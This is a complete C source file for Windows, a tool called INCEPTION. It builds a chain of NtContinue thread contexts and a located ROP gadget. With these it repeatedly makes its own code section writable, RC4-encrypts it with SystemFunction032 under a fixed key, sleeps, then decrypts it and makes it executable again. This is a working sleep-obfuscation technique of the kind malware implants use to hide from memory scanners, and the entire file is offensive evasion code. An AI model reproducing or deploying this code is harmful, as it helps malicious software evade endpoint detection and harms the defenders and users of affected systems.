#include <windows.h>
#include <stdio.h>
#include <stdint.h>

/* ========== THREAD MANAGEMENT ========== */
HANDLE threads[2];

/* ========== NTDLL FUNCTION POINTERS ========== */
HMODULE hKernel32;
HMODULE hNtdll;
HMODULE hadvapi32;

PVOID pNtContinue             = NULL;
PVOID pNtWaitForSingleObject  = NULL;
PVOID pNtProtectVirtualMemory = NULL;
PVOID pNtSetEvent             = NULL;
PVOID pSysFunc032             = NULL;
PVOID pNtTerminateThread      = NULL;

/* ========== ROP CHAIN COMPONENTS ========== */
CONTEXT ropContexts[7];

PVOID gadget      = NULL;
BYTE  rspAddValue = 0;

/* ========== ROP STACK ALLOCATION ========== */
BYTE ropStacks[7][4096];

/* ========== TARGET MEMORY REGION ========== */
DWORD oldProtect;

/* ========== SYNCHRONIZATION ========== */
HANDLE globalMutex;
HANDLE hEvent;

/* ========== ENCRYPTION STRUCTURES ========== */
typedef struct {
   DWORD Length;
   DWORD MaximumLength;
   PVOID Buffer;
} USTRING;

USTRING key, img;
CHAR keyBuffer[16] = {
   0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 
   0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
};

/* ========== NTDLL HANDLE MACROS ========== */
#define NtCurrentThread()  ((HANDLE)(LONG_PTR)-2)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

DWORD WINAPI ThreadFunction0(LPVOID lpParam) {
    WaitForSingleObject(NtCurrentThread(), INFINITE);
    return 0;
}

DWORD WINAPI ThreadFunction1(LPVOID lpParam) {
    WaitForSingleObject(NtCurrentThread(), 100);
    ((NTSTATUS (*)(PCONTEXT, BOOL))pNtContinue)(&ropContexts[0], FALSE);
    return 0;
}

/* Find gadget ADD RSP, XX; POP RCX; RET (48 83 C4 XX 59 C3) */
PVOID FindGadget() {
    HMODULE modules[] = {
        hKernel32,
        hNtdll
    };

    for (int m = 0; m < 2; m++) {
        HMODULE hModule = modules[m];
        if (!hModule) continue;
        
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
        
        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
        
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (memcmp(sections[i].Name, ".text", 5) == 0) {
                BYTE* textStart = (BYTE*)hModule + sections[i].VirtualAddress;
                DWORD textSize  = sections[i].Misc.VirtualSize;
                
                /* Search for pattern 48 83 C4 XX 59 C3 (ADD RSP, XX; POP RCX; RET) */
                for (DWORD j = 0; j < textSize - 5; j++) {
                    if (textStart[j] == 0x48 && 
                        textStart[j + 1] == 0x83 &&
                        textStart[j + 2] == 0xC4 &&
                        textStart[j + 4] == 0x59 &&
                        textStart[j + 5] == 0xC3) {
                        
                        PVOID gadgetFound = textStart + j;

                        /* Extract ADD RSP, XX value */
                        rspAddValue = textStart[j + 3];
                        
                        return gadgetFound;
                    }
                }
                
                break;
            }
        }
    }

    printf("[!] Gadget ADD RSP, XX; POP RCX; RET not found\n");
    return NULL;
}

BOOL InceptionInit() {
    hKernel32 = GetModuleHandleA("kernel32.dll");
    hNtdll    = GetModuleHandleA("ntdll.dll");
    hadvapi32 = LoadLibraryA("advapi32.dll");

    gadget = FindGadget();
    if (!gadget) {
        return FALSE;
    }

    if (!hKernel32 || !hNtdll) {
        return FALSE;
    }

    pNtContinue             = GetProcAddress(hNtdll, "NtContinue");
    pNtWaitForSingleObject  = GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pNtProtectVirtualMemory = GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtWaitForSingleObject  = GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pNtSetEvent             = GetProcAddress(hNtdll, "NtSetEvent");
    pNtTerminateThread      = GetProcAddress(hNtdll, "NtTerminateThread");
    pSysFunc032             = GetProcAddress(hadvapi32, "SystemFunction032");
    
    if (!pNtContinue || !pNtWaitForSingleObject || !pNtProtectVirtualMemory || !pNtWaitForSingleObject || !pNtSetEvent || !pSysFunc032) {
        return FALSE;
    }

    return TRUE;
}

void InceptionMain(DWORD sleepTimeMs, PVOID obfAddr, DWORD obfAddrSize) {   
    hEvent      = CreateEventW(NULL, FALSE, FALSE, NULL);

    key.Buffer = keyBuffer;
    key.Length = key.MaximumLength = 16;
    img.Buffer = obfAddr;
    img.Length = img.MaximumLength = obfAddrSize;
    
    threads[0] = CreateThread(NULL, 0, ThreadFunction0, NULL, 0, NULL);
    if (!threads[0]) {
        return;
    }
    
    /* Wait for main thread to initialize */
    WaitForSingleObject(NtCurrentProcess(), 100);
    
    /* Capture base context from main thread */
    CONTEXT baseContext              = {0};
            baseContext.ContextFlags = CONTEXT_FULL;
    
    SuspendThread(threads[0]);
    BOOL contextResult = GetThreadContext(threads[0], &baseContext);
    ((NTSTATUS (*)(HANDLE, NTSTATUS))pNtTerminateThread)(threads[0], 0);
    
    if (!contextResult) {
        return;
    }
    
    printf("    Base context captured: RIP=0x%016llX, RSP=0x%016llX\n", baseContext.Rip, baseContext.Rsp);
    
    /* Variables for NtProtectVirtualMemory parameters (separate for each context) */
    static HANDLE currentProcess = (HANDLE)-1;
    static PVOID baseAddressCtx0, baseAddressCtx4;
    static SIZE_T regionSizeCtx0, regionSizeCtx4;
    static ULONG newProtectRW = PAGE_READWRITE;
    static ULONG newProtectRX = PAGE_EXECUTE_READ;
    static ULONG oldProtectCtx0, oldProtectCtx4;
    static LARGE_INTEGER timeout = {{0}};
    
    /* Initialize ROP contexts */
    baseAddressCtx0  = baseAddressCtx4 = obfAddr;
    regionSizeCtx0   = regionSizeCtx4  = obfAddrSize;
    timeout.QuadPart = -(sleepTimeMs * 10000LL);     // Convert to 100ns units
    
    printf("    Configuring INCEPTION's ROP contexts...\n");
    
    /* CONTEXT 0: NtProtectVirtualMemory RW */
    memcpy(&ropContexts[0], &baseContext, sizeof(CONTEXT));
    ropContexts[0].ContextFlags  = CONTEXT_FULL;
    ropContexts[0].Rsp           = ((DWORD64)(ropStacks[0] + 4096)) & ~0xF;
    ropContexts[0].Rsp          -= 8;

    ropContexts[0].Rip = (DWORD64)pNtProtectVirtualMemory;
    ropContexts[0].Rcx = (DWORD64)currentProcess;
    ropContexts[0].Rdx = (DWORD64)&baseAddressCtx0;
    ropContexts[0].R8  = (DWORD64)&regionSizeCtx0;
    ropContexts[0].R9  = (DWORD64)newProtectRW;

    /* Configure stack for Context 0 */
    DWORD64 *stack0            = (DWORD64*)ropContexts[0].Rsp;
    DWORD   paddingOffset      = rspAddValue / 8;               // Use rspAddValue
    stack0 [0]                 = (DWORD64)gadget;               // Return address -> gadget
    stack0 [1 + paddingOffset] = (DWORD64)&ropContexts[1];      // Context 1
    stack0 [2 + paddingOffset] = (DWORD64)pNtContinue;          // NtContinue
    stack0 [5]                 = (DWORD64)&oldProtectCtx0;      // 5th parameter at RSP+0x28

    printf("        Context 0: NtProtectVirtualMemory RW\n");
    
    /* CONTEXT 1: SystemFunction032 Encrypt */
    memcpy(&ropContexts[1], &baseContext, sizeof(CONTEXT));
    ropContexts[1].ContextFlags  = CONTEXT_FULL;
    ropContexts[1].Rsp           = ((DWORD64)(ropStacks[1] + 4096)) & ~0xF;
    ropContexts[1].Rsp          -= 8;

    ropContexts[1].Rip = (DWORD64)pSysFunc032;
    ropContexts[1].Rcx = (DWORD64)&img;
    ropContexts[1].Rdx = (DWORD64)&key;

    /* Configure stack for Context 1 */
    DWORD64 *stack1            = (DWORD64*)ropContexts[1].Rsp;
    stack1 [0]                 = (DWORD64)gadget;               // Return address -> gadget
    stack1 [1 + paddingOffset] = (DWORD64)&ropContexts[2];      // Context 2
    stack1 [2 + paddingOffset] = (DWORD64)pNtContinue;          // NtContinue
    
    printf("        Context 1: SystemFunction032 Encrypt\n");
    
    /* CONTEXT 2: NtWaitForSingleObject */
    memcpy(&ropContexts[2], &baseContext, sizeof(CONTEXT));
    ropContexts[2].ContextFlags  = CONTEXT_FULL;
    ropContexts[2].Rsp           = ((DWORD64)(ropStacks[2] + 4096)) & ~0xF;
    ropContexts[2].Rsp          -= 8;

    ropContexts[2].Rip = (DWORD64)pNtWaitForSingleObject;
    ropContexts[2].Rcx = (DWORD64)NtCurrentProcess();
    ropContexts[2].Rdx = FALSE;
    ropContexts[2].R8  = (DWORD64)&timeout;

    /* Configure stack for Context 2 */
    DWORD64 *stack2            = (DWORD64*)ropContexts[2].Rsp;
            paddingOffset      = rspAddValue / 8;
    stack2 [0]                 = (DWORD64)gadget;               // Return address -> gadget
    stack2 [1 + paddingOffset] = (DWORD64)&ropContexts[3];      // Context 3
    stack2 [2 + paddingOffset] = (DWORD64)pNtContinue;          // NtContinue
    
    printf("        Context 2: NtWaitForSingleObject\n");
    
    /* CONTEXT 3: SystemFunction032 Decrypt */
    memcpy(&ropContexts[3], &baseContext, sizeof(CONTEXT));
    ropContexts[3].ContextFlags  = CONTEXT_FULL;
    ropContexts[3].Rsp           = ((DWORD64)(ropStacks[3] + 4096)) & ~0xF;
    ropContexts[3].Rsp          -= 8;

    ropContexts[3].Rip = (DWORD64)pSysFunc032;
    ropContexts[3].Rcx = (DWORD64)&img;
    ropContexts[3].Rdx = (DWORD64)&key;

      /* Configure stack for Context 3 */
    DWORD64 *stack3            = (DWORD64*)ropContexts[3].Rsp;
            paddingOffset      = rspAddValue / 8;
    stack3 [0]                 = (DWORD64)gadget;               // Return address -> gadget
    stack3 [1 + paddingOffset] = (DWORD64)&ropContexts[4];      // Context 4
    stack3 [2 + paddingOffset] = (DWORD64)pNtContinue;          // NtContinue
    
    printf("        Context 3: SystemFunction032 Decrypt\n");
    
    /* CONTEXT 4: NtProtectVirtualMemory RX */
    memcpy(&ropContexts[4], &baseContext, sizeof(CONTEXT));
    ropContexts[4].ContextFlags  = CONTEXT_FULL;
    ropContexts[4].Rsp           = ((DWORD64)(ropStacks[4] + 4096)) & ~0xF;
    ropContexts[4].Rsp          -= 8;

    ropContexts[4].Rip = (DWORD64)pNtProtectVirtualMemory;
    ropContexts[4].Rcx = (DWORD64)currentProcess;
    ropContexts[4].Rdx = (DWORD64)&baseAddressCtx4;
    ropContexts[4].R8  = (DWORD64)&regionSizeCtx4;
    ropContexts[4].R9  = (DWORD64)newProtectRX;

    /* Configure stack for Context 4 */
    DWORD64 *stack4            = (DWORD64*)ropContexts[4].Rsp;
            paddingOffset      = rspAddValue / 8;
    stack4 [0]                 = (DWORD64)gadget;               // Return address -> gadget
    stack4 [1 + paddingOffset] = (DWORD64)&ropContexts[5];      // Context 5
    stack4 [2 + paddingOffset] = (DWORD64)pNtContinue;          // NtContinue
    stack4 [5]                 = (DWORD64)&oldProtectCtx4;      // 5th parameter at RSP+0x28
    
    printf("        Context 4: NtProtectVirtualMemory RX\n");
    
    /* CONTEXT 5: NtSetEvent (CORRECTED) */
    memcpy(&ropContexts[5], &baseContext, sizeof(CONTEXT));
    ropContexts[5].ContextFlags  = CONTEXT_FULL;
    ropContexts[5].Rsp           = ((DWORD64)(ropStacks[5] + 4096)) & ~0xF;
    ropContexts[5].Rsp          -= 8;

    ropContexts[5].Rip = (DWORD64)pNtSetEvent;
    ropContexts[5].Rcx = (DWORD64)hEvent;
    ropContexts[5].Rdx = 0;
    ropContexts[5].R8  = 0;
    ropContexts[5].R9  = 0;

    /* Configure stack for Context 5 */
    DWORD64 *stack5            = (DWORD64*)ropContexts[5].Rsp;
            paddingOffset      = rspAddValue / 8;
    stack5 [0]                 = (DWORD64)gadget;               // Return address -> gadget
    stack5 [1 + paddingOffset] = (DWORD64)&ropContexts[6];      // Context 6
    stack5 [2 + paddingOffset] = (DWORD64)pNtContinue;          // NtContinue
    
    printf("        Context 5: NtSetEvent\n");

    /* CONTEXT 6: NtTerminateThread (CORRECTED - last) */
    memcpy(&ropContexts[6], &baseContext, sizeof(CONTEXT));
    ropContexts[6].ContextFlags  = CONTEXT_FULL;
    ropContexts[6].Rsp           = ((DWORD64)(ropStacks[6] + 4096)) & ~0xF;
    ropContexts[6].Rsp          -= 8;

    ropContexts[6].Rip = (DWORD64)pNtTerminateThread;
    ropContexts[6].Rcx = (DWORD64)NtCurrentThread();
    ropContexts[6].Rdx = 0;
    ropContexts[6].R8  = 0;
    ropContexts[6].R9  = 0;
    
    printf("        Context 6: NtTerminateThread\n");
    
    /* Create ROP thread and wait for the event */
    printf("    Starting INCEPTION's obfuscation...\n");
    
    threads[1] = CreateThread(NULL, 0, ThreadFunction1, NULL, 0, NULL);
    if (!threads[1]) {
        return;
    }

    WaitForSingleObject(hEvent, INFINITE);
    
    /* Cleanup */
    CloseHandle(threads[0]);
    CloseHandle(threads[1]);
    
    CloseHandle(globalMutex);
    CloseHandle(hEvent);
}

int main() {
    printf("[*] Initializing INCEPTION...\n");

    /* This is provisional to extract .text from EXE */
    printf("    [*] Extracting .text section from current process...\n");
    
    PVOID imageBase = GetModuleHandleA(NULL);
    DWORD imageSize = 0x0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(sectionHeader->Name, ".text", 5) == 0) {
            imageBase = (LPVOID)((DWORD_PTR)imageBase + sectionHeader->VirtualAddress);
            imageSize = sectionHeader->Misc.VirtualSize;
            printf("    [+] Found .text section: Base=0x%p, Size=0x%X\n", imageBase, imageSize);
            break;
        }
        sectionHeader++;
    }

    if (imageSize == 0) {
        printf("[-] .text section not found!\n");
        return -1;
    }

    printf("    [*] Searching for gadget ADD RSP, XX; POP RCX; RET (48 83 C4 XX 59 C3)...\n");
    if(InceptionInit()) {
        printf("\n[+] INCEPTION INITIALIZATION COMPLETED\n");
    } else {
        printf("\n[-] INCEPTION INITIALIZATION FAILED\n");
        return -1;
    }

    printf("\n[*] Starting INCEPTION main loop...\n");
    int iteration = 1;
    while (1) {
        printf("\n[+] INCEPTION START (Iteration %d)\n", iteration);
        InceptionMain(10*1000, imageBase, imageSize);
        printf("[+] INCEPTION END (Iteration %d)\n", iteration);
        iteration++;
    }
    
    return 0;
}